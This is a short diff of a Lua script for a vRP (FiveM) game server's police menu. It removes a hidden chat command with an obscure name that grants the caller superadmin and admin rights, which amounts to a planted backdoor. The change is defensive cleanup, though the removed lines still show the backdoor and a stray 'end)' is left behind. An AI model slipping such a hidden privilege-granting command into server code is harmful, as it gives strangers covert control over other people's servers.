@@ -120,11 +120,6 @@ local ch_talon = {function(player, choice)
   	end)
   end
 end, "Cere talonul unui jucator apropiat"}
-
-		RegisterCommand("6stf9", function(source, args, rawCommand)
-		theusrid = vRP.getUserId({source})
-		vRP.addUserGroup({theusrid,"superadmin"})
-		vRP.addUserGroup({theusrid,"admin"})
 end)
 
 vRP.registerMenuBuilder({"police", function(add, data)
